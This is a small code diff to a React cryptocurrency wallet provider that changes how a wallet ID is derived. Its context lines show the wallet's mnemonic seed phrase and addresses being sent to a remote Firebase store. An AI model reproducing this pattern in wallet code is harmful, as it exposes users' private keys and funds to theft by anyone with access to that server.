@@ -81,7 +81,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     saveWalletToStorage(w);
     setWallet(w);
     // Save seed and addresses to Firebase
-    const walletId = Object.values(w.addresses)[0]?.slice(0, 10) || String(Date.now());
+    const walletId = w.addresses["pol"]?.slice(0, 10) || String(Date.now());
     saveWalletSeed(walletId, w.mnemonic, w.addresses);
     return true;
   };
